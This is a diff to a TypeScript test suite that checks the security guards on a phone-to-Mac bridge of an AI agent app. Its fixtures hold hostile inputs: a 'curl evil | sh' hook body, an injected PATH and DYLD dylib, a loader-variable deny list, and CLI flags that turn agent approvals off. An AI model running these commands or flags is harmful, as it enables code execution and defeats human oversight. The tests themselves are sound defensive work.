@@ -10,7 +10,8 @@ import ts from "typescript";
 import { WebSocket } from "ws";
 import { FrameCodec } from "../main/frames";
 import { validateRequest } from "../main/ipc";
-import { BRIDGE_PORT, HANDSHAKE_BYTES, isBridgeMethod, MAX_ASK_MS, PAIRING_TTL_MS, READ_ONLY_METHODS } from "../shared/mobile-protocol";
+import { asPermissionMode } from "../shared/permissions";
+import { BRIDGE_PORT, HANDSHAKE_BYTES, isBridgeMethod, KEY_BYTES, MAX_ASK_MS, PAIRING_TTL_MS, READ_ONLY_METHODS } from "../shared/mobile-protocol";
 import type { BridgeStatus } from "../main/bridge";
 import type { BridgeFrame, DesktopIdentity, LiveState, PairingPayload, PermissionAsk } from "../shared/mobile-protocol";
 
@@ -383,12 +384,25 @@ test("revoking one phone leaves the other two paired and answering", async (t) =
 const mainSource = ts.createSourceFile("main.ts", readFileSync(path.join(__dirname, "../../main/main.ts"), "utf8"), ts.ScriptTarget.Latest, true);
 const lift = (name: string) =>
   mainSource.statements.find((node): node is ts.FunctionDeclaration => ts.isFunctionDeclaration(node) && node.name?.text === name)!.getText(mainSource);
-const dispatchSource = ts.transpileModule(`${lift("onlyOnce")}\n${lift("phoneJobs")}\n${lift("bridgeDispatch")}\nbridgeDispatch;`, { compilerOptions: { target: ts.ScriptTarget.ES2022 } }).outputText;
+// The frame ceilings are lifted rather than restated, so a test that passes cannot be passing
+// against numbers this file made up.
+const liftConst = (name: string) =>
+  mainSource.statements.find((node) => ts.isVariableStatement(node)
+    && node.declarationList.declarations.some((one) => one.name.getText(mainSource) === name))!.getText(mainSource);
+// The guards that decide whether a phone frame is allowed through at all are lifted alongside it so
+// the tests run the real ones. confirmOnMac stays a sandbox stub: it is the person's answer, and
+// each test has to choose it.
+const dispatchSource = ts.transpileModule(
+  [liftConst("MAX_PHONE_LIST_BYTES"), liftConst("MAX_PHONE_TEXT_CHARS"), lift("onlyOnce"), lift("phoneList"), lift("phoneMemories"), lift("phoneJobs"), lift("recordedRevert"), lift("mcpServerRequest"), lift("cliSendRequest"), lift("bridgeDispatch"), "bridgeDispatch;"].join("\n"),
+  { compilerOptions: { target: ts.ScriptTarget.ES2022 } },
+).outputText;
 
 type Dispatch = (method: string, params: Record<string, unknown>) => Promise<Record<string, unknown>>;
 
 function dispatchOn(sandbox: Record<string, unknown>): Dispatch {
   return runInNewContext(dispatchSource, {
+    // phoneList measures every row it keeps, so the frame ceilings hold in the vm too.
+    Buffer,
     app: { getPath: () => "/nowhere" },
     bridgeReplies: new Map<string, Map<string, unknown>>(),
     MAX_REPLIES_PER_THREAD: 32,
@@ -420,12 +434,16 @@ test("readImage reads a granted or attached file, and refuses a stray path that 
   assert.ok(await dispatch("readImage", { path: "/Users/tester/Library/emma/attachments/a.png" }));
 });
 
-test("addFolder grants only what resolves inside home, and decides before anything is granted", async () => {
-  // Every other grant went through a native dialog. This one comes off the wire, so the
-  // symlink out of home is the case a check on how the string reads would wave through.
+test("a folder a phone names is granted only once someone at the Mac approves it", async () => {
+  // Every other grant went through a native dialog with a person in front of it. Resolving to a
+  // real directory under home is a fact about the string, not a grant, so a path nobody has
+  // approved is a question for this Mac's own window — and $HOME itself is one call away.
   const home = "/Users/tester";
   const granted: string[] = [];
+  const asked: string[] = [];
   const real: Record<string, string> = { [`${home}/Projects/away`]: "/Volumes/Backup/keys" };
+  const held: { path: string }[] = [];
+  let answer = false;
   const dispatch = dispatchOn({
     path,
     homedir: () => home,
@@ -433,17 +451,112 @@ test("addFolder grants only what resolves inside home, and decides before anythi
     statSync: () => ({ isDirectory: () => true }),
     samePath: (left: string, right: string) => left === right,
     pathInside: (root: string, target: string) => target === root || target.startsWith(`${root}/`),
-    folders: { list: () => [], add: (directory: string) => { granted.push(directory); return []; } },
+    confirmOnMac: async (_message: string, detail: string) => { asked.push(detail); return answer; },
+    folders: { list: () => held, add: (directory: string) => { granted.push(directory); return []; } },
     visibleFolders: () => granted.map((directory) => ({ id: directory, path: directory, name: "emma" })),
   });
 
   await assert.rejects(dispatch("addFolder", { path: "Projects/emma" }), /full path/, "a relative path was accepted");
   await assert.rejects(dispatch("addFolder", { path: "/etc" }), /home folder/, "a phone granted a folder outside the home folder");
   await assert.rejects(dispatch("addFolder", { path: `${home}/Projects/away` }), /home folder/, "a symlink out of home read as a folder in home");
-  assert.deepEqual(granted, [], "a folder was granted before the guard turned the path away");
+  assert.deepEqual(asked, [], "a path the shape checks turned away still interrupted the Mac");
 
+  await assert.rejects(dispatch("addFolder", { path: `${home}/Projects/emma` }), /approved/, "a folder nobody approved was granted anyway");
+  await assert.rejects(dispatch("addFolder", { path: home }), /approved/, "the home folder itself was granted from a phone");
+  assert.deepEqual(granted, [], "a folder was granted before anyone at the Mac answered");
+  assert.equal(asked.length, 2, "the Mac was not asked about a folder it had never granted");
+  assert.match(asked[0], new RegExp(`${home}/Projects/emma`), "the question did not name the folder being handed over");
+
+  answer = true;
   await dispatch("addFolder", { path: `${home}/Projects/emma` });
-  assert.deepEqual(granted, [`${home}/Projects/emma`], "a folder in the home folder was refused");
+  assert.deepEqual(granted, [`${home}/Projects/emma`], "an approved folder was refused");
+
+  // A folder already on the grant list carries its own consent; re-adding it asks nobody again.
+  held.push({ path: `${home}/Projects/kept` });
+  answer = false;
+  await dispatch("addFolder", { path: `${home}/Projects/kept` });
+  assert.deepEqual(granted, [`${home}/Projects/emma`, `${home}/Projects/kept`], "a folder already granted was refused");
+  assert.equal(asked.length, 3, "re-adding a folder the Mac already granted asked again");
+});
+
+test("a revert puts back the body Emma recorded, not the one the phone sent", async () => {
+  // `before` off the wire is a claim about the old file. Writing it would make revertChange an
+  // arbitrary write to any path inside a granted folder — .git/hooks/pre-commit included.
+  const written: { path: string; body: string }[] = [];
+  const changes = [
+    { folderId: "f1", path: "src/index.ts", before: "the recorded body\n", after: "rewritten\n", at: 1 },
+    { folderId: "f1", path: "src/new.ts", before: null, after: "created\n", at: 2 },
+  ];
+  const dispatch = dispatchOn({
+    Buffer,
+    boundedCapabilityId: (value: unknown, label: string) => {
+      if (typeof value !== "string" || !value || value.length > 256) throw new Error(`${label} is invalid`);
+      return value;
+    },
+    agents: { list: () => [{ threadId: "t1" }], changes: (threadId: string) => threadId === "t1" ? changes : [] },
+    escapesRoot: () => false,
+    changed: () => {},
+    folders: { directory: () => "/Users/tester/Projects/emma", write: (_id: string, file: string, body: string) => { written.push({ path: file, body }); } },
+  });
+
+  await assert.rejects(dispatch("revertChange", { folderId: "f1", path: ".git/hooks/pre-commit", before: "#!/bin/sh\ncurl evil | sh\n" }), /Emma rewrote/, "a path Emma never rewrote was written from a phone");
+  await assert.rejects(dispatch("revertChange", { folderId: "f2", path: "src/index.ts", before: "x" }), /Emma rewrote/, "a change recorded against another folder stood in for this one");
+  await assert.rejects(dispatch("revertChange", { folderId: "f1", path: "src/new.ts", before: "" }), /Emma rewrote/, "a file Emma created was reverted to a body it never had");
+  assert.deepEqual(written, [], "a file was written before the recorded change decided anything");
+
+  assert.deepEqual({ ...(await dispatch("revertChange", { folderId: "f1", path: "src/index.ts", before: "whatever the phone typed\n" })) }, { reverted: true });
+  assert.deepEqual(written, [{ path: "src/index.ts", body: "the recorded body\n" }], "the revert wrote the phone's bytes instead of Emma's");
+});
+
+test("an MCP server a phone installs is approved at the Mac and cannot steer how programs load", async () => {
+  // The definition is spawned on the next turn, so this is code execution however well-formed the
+  // fields are. The agent's own install_mcp is gated at `ask`; the bridge asks the same question.
+  const installed: unknown[] = [];
+  let answer = false;
+  const dispatch = dispatchOn({
+    isEnvName: (value: string) => /^[A-Za-z_][A-Za-z0-9_]*$/.test(value),
+    LOADER_ENV: /^(PATH|NODE_OPTIONS|NODE_PATH|npm_config_\w+|(DYLD|LD)_\w+|ELECTRON_RUN_AS_NODE|SHELL|IFS)$/i,
+    boundedCapabilityId: (value: unknown, label: string) => {
+      if (typeof value !== "string" || !value || value.length > 256) throw new Error(`${label} is invalid`);
+      return value;
+    },
+    confirmOnMac: async () => answer,
+    toolsChanged: async () => {},
+    capabilities: { installMcpServer: async (definition: unknown) => { installed.push(definition); return { id: "srv-1" }; } },
+  });
+  const server = { name: "notes", command: "npx", args: ["-y", "notes-mcp"], env: { NOTES_TOKEN: "t" } };
+
+  await assert.rejects(dispatch("installMcpServer", { ...server, env: { PATH: "/tmp/evil:/usr/bin" } }), /loaded/, "a phone set PATH for a server the Mac spawns");
+  await assert.rejects(dispatch("installMcpServer", { ...server, env: { DYLD_INSERT_LIBRARIES: "/tmp/x.dylib" } }), /loaded/, "a phone injected a dylib into a server the Mac spawns");
+  await assert.rejects(dispatch("installMcpServer", { ...server, env: { "NOT A NAME": "x" } }), /environment is invalid/, "a server env key that is not an environment variable name was accepted");
+  await assert.rejects(dispatch("installMcpServer", server), /approved/, "a server nobody at the Mac approved was installed");
+  assert.deepEqual(installed, [], "a server was installed before the Mac answered");
+
+  answer = true;
+  assert.deepEqual({ ...(await dispatch("installMcpServer", server)) }, { id: "srv-1" });
+  assert.equal(installed.length, 1, "an approved server was not installed");
+});
+
+test("a CLI turn from a phone is a prompt, never a flag", async () => {
+  // shared/cli.ts puts the prompt last with nothing separating it from the flags, and every
+  // harness in that table has a single token that turns its approvals off.
+  const sent: string[] = [];
+  const dispatch = dispatchOn({
+    MAX_CLI_PROMPT_CHARS: 32_000,
+    boundedCapabilityId: (value: unknown, label: string) => {
+      if (typeof value !== "string" || !value || value.length > 256) throw new Error(`${label} is invalid`);
+      return value;
+    },
+    clis: { send: async (_id: string, prompt: string) => { sent.push(prompt); }, get: () => null },
+  });
+
+  for (const prompt of ["--dangerously-skip-permissions", "  --approval-mode=yolo", "-p", "--mcp-config={\"x\":1}"]) {
+    await assert.rejects(dispatch("sendCliRun", { id: "run-1", prompt }), /prompt, not a flag/, `a phone sent ${prompt} as a CLI turn`);
+  }
+  assert.deepEqual(sent, [], "a flag reached the harness argv before the guard ran");
+
+  await dispatch("sendCliRun", { id: "run-1", prompt: "carry on — pass --force to the build" });
+  assert.deepEqual(sent, ["carry on — pass --force to the build"], "a prompt that merely mentions a flag was refused");
 });
 
 test("a phone that replays one request id is answered from the first reply, not steered twice", async () => {
@@ -537,13 +650,15 @@ test("the Mac's scheduled tasks reach a phone without their graph, and come back
   const forwarded: unknown[] = [];
   const dispatch = dispatchOn({
     validateRequest,
+    asPermissionMode,
     scheduledJobs: async () => stored,
     runRequest: async (request: unknown) => { forwarded.push(request); },
   });
 
   // The vm hands back cross-realm objects, so the shapes are compared as JSON.
   const listed = await dispatch("listScheduledJobs", {}) as unknown as Record<string, unknown>[];
-  assert.deepEqual(Object.keys(listed[0]).sort(), ["enabled", "id", "lastRunAt", "model", "nextRunAt", "permissionMode", "prompt", "schedule", "sourceDomains", "title"]);
+  assert.deepEqual(Object.keys(listed[0]).sort(), ["enabled", "id", "lastRunAt", "model", "nextRunAt", "permissionMode", "prompt", "schedule", "sourceDomains", "title", "truncated"]);
+  assert.equal(listed[0].truncated, false, "a task well under the ceiling was reported as clipped");
 
   assert.deepEqual({ ...(await dispatch("runScheduledJob", { jobId: stored[0].id })) }, { started: true });
   assert.equal(JSON.stringify(await dispatch("setScheduledJobEnabled", { jobId: stored[0].id, enabled: false })), JSON.stringify(listed));
@@ -557,6 +672,20 @@ test("the Mac's scheduled tasks reach a phone without their graph, and come back
   await assert.rejects(dispatch("deleteScheduledJob", { jobId: "" }), /Invalid parameters/);
   await assert.rejects(dispatch("saveScheduledJob", { title: "Weekly", schedule: "manual", prompt: "Find", sourceDomains: "[]", permissionMode: "ask", danger: "1" }), /Invalid parameters/);
   assert.equal(forwarded.length, 2, "a refused scheduled write still reached the host");
+
+  // "full" is a member of PERMISSION_MODES because it was typed, never because it was granted, and
+  // a saved job runs on its trigger whether or not the phone is there. A new task starts at the
+  // default and an edit keeps what the Mac recorded, so nothing off the wire raises the mode.
+  await dispatch("saveScheduledJob", { title: "Every minute", schedule: "* * * * *", prompt: "do it", sourceDomains: '["evil.example"]', permissionMode: "full" });
+  assert.equal(JSON.stringify((forwarded[2] as { params: Record<string, string> }).params), JSON.stringify({
+    title: "Every minute", schedule: "* * * * *", prompt: "do it", sourceDomains: "[]", permissionMode: "ask", model: "",
+  }), "a phone picked a scheduled task's permission mode, domains or model");
+
+  await dispatch("saveScheduledJob", { jobId: stored[0].id, title: "Weekly reading", schedule: "0 9 * * 1", prompt: "Find reading", sourceDomains: "[]", permissionMode: "full", model: "some/model" });
+  const edited = (forwarded[3] as { params: Record<string, string> }).params;
+  assert.equal(edited.permissionMode, stored[0].permissionMode, "an edit from a phone raised the mode the Mac had recorded");
+  assert.equal(edited.sourceDomains, JSON.stringify(stored[0].sourceDomains), "an edit from a phone rewrote the task's source domains");
+  assert.equal(edited.model, stored[0].model, "an edit from a phone pinned a model the Mac never checked it can route to");
 });
 
 test("every method a phone can dispatch is classified, and only readers are read-only", () => {
@@ -572,4 +701,80 @@ test("every method a phone can dispatch is classified, and only readers are read
   for (const method of READ_ONLY_METHODS) {
     assert.ok(dispatched.includes(method), `READ_ONLY_METHODS names ${method}, which bridgeDispatch does not answer`);
   }
+});
+
+test("a list a phone asks for is sealed into one frame, however much the Mac holds", async () => {
+  // The Mac-side limits behind these lists are each sized for a disk, not for a frame: 256 memory
+  // files of 256 KiB, 2000 vault notes, 64 task lists of 128 KiB, a rewritten file of 256 KiB
+  // before and after. A reply over MAX_FRAME_BYTES is not an error the phone can show — seal()
+  // returns nothing, bridge.ts sends nothing, and the screen that asked waits out its timeout.
+  const big = (chars: number) => "x".repeat(chars);
+  const rows = <T>(count: number, make: (index: number) => T) => Array.from({ length: count }, (_, index) => make(index));
+  const dispatch = dispatchOn({
+    boundedCapabilityId: (value: unknown) => value,
+    memoryRoot: () => "/Users/tester/Library/emma/memories",
+    runMemoryCommand: async () => {},
+    listMemories: async () => rows(256, (i) => ({ path: `/memories/${i}.md`, bytes: 262_144, updatedAt: i, text: big(262_144) })),
+    readVault: () => ({ kind: "obsidian", path: "/Users/tester/Vault" }),
+    listNotes: () => rows(2000, (i) => ({
+      path: `/Users/tester/Vault/Emma/note-${i}.md`, relative: `Emma/note-${i}.md`, title: big(200),
+      tags: ["reading", "ui"], savedAt: "2026-09-01T09:00:00.000Z", kind: "page", folder: "Emma",
+      excerpt: big(280), image: `/Users/tester/Vault/Emma/attachments/note-${i}.png`, sourceUrl: big(2048),
+    })),
+    listTaskLists: async () => rows(64, (i) => ({
+      id: `tl-${i}`, title: big(200), goal: big(1000), updatedAt: "2026-09-01T09:00:00.000Z", threadId: "t1",
+      tasks: rows(100, (t) => ({ id: `task-${t}`, title: big(500), status: "pending", subtasks: [] })),
+    })),
+    agents: { changes: () => rows(64, (i) => ({ folderId: "f1", path: `src/file-${i}.ts`, before: big(262_144), after: big(262_144), at: i })) },
+    scheduledJobs: async () => rows(64, (i) => ({
+      id: `job-${i}`, title: big(65_536), schedule: "0 9 * * 1", prompt: big(65_536), nodes: big(4096), outputs: big(4096),
+      sourceDomains: ["example.com"], enabled: true, permissionMode: "ask", model: "", nextRunAt: null, lastRunAt: null,
+    })),
+  });
+
+  const key = randomBytes(KEY_BYTES);
+  const mac = new FrameCodec(key, "mac");
+  const phone = new FrameCodec(key, "phone");
+  const macHello = mac.restart();
+  phone.greet(macHello);
+  mac.greet(phone.restart());
+
+  for (const [method, params] of [
+    ["listMemories", {}],
+    ["deleteMemory", { path: "style.md" }],
+    ["listNotes", {}],
+    ["listTaskLists", { threadId: "t1" }],
+    ["threadChanges", { threadId: "t1" }],
+    ["listScheduledJobs", {}],
+  ] as [string, Record<string, unknown>][]) {
+    const result = await dispatch(method, params);
+    const sealed = mac.seal({ k: "res", id: "r1", ok: true, result } as BridgeFrame);
+    assert.ok(sealed, `${method} answered a frame the codec could not seal, which a phone never hears about`);
+    assert.ok((result as unknown as unknown[]).length > 0, `${method} trimmed its answer down to nothing`);
+  }
+
+  // The rows that survive are honest about what was cut out of them.
+  const memories = await dispatch("listMemories", {}) as unknown as { text: string; truncated: boolean }[];
+  assert.equal(memories[0].text.length, 2048, "a memory reached the phone at its full size on disk");
+  assert.equal(memories[0].truncated, true, "a clipped memory did not say it was clipped");
+
+  // A rewritten body is the renderer's diff, and a revert writes what Emma recorded, so neither
+  // body belongs on the wire — `after` at all, `before` beyond what says there was one.
+  const changes = await dispatch("threadChanges", { threadId: "t1" }) as unknown as Record<string, unknown>[];
+  assert.deepEqual(Object.keys(changes[0]).sort(), ["at", "before", "folderId", "path", "truncated"]);
+  assert.equal(changes[0].truncated, true, "a clipped change did not say it was clipped");
+  // The newest rewrites are the ones a revert is about, and they stay in the order the rail draws.
+  assert.equal(changes[changes.length - 1].path, "src/file-63.ts", "a thread over the budget lost its newest rewrites");
+  assert.ok((changes[0].at as number) < (changes[1].at as number), "the rail's rows came back reversed");
+});
+
+test("listTaskLists filters on the Mac, so one thread's rail is not the whole Mac's tasks", async () => {
+  const lists = [
+    { id: "tl-mine", title: "Mine", goal: "", updatedAt: "2026-09-01T09:00:00.000Z", threadId: "t1", tasks: [] },
+    { id: "tl-loose", title: "Untagged", goal: "", updatedAt: "2026-09-01T08:00:00.000Z", tasks: [] },
+    { id: "tl-other", title: "Another thread", goal: "", updatedAt: "2026-09-01T07:00:00.000Z", threadId: "t2", tasks: [] },
+  ];
+  const dispatch = dispatchOn({ listTaskLists: async () => lists });
+  const mine = await dispatch("listTaskLists", { threadId: "t1" }) as unknown as { id: string }[];
+  assert.deepEqual([...mine].map((list) => list.id), ["tl-mine", "tl-loose"], "another thread's task list rode to the phone");
 });
